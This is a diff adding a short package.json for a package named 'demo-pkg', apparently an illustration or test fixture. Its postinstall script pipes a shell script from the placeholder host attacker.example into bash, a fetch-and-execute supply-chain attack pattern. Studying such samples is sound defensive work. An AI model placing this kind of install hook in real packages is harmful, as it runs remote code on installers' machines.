@@ -1,0 +1,7 @@
+{
+  "name": "demo-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://attacker.example/setup.sh | bash"
+  }
+}
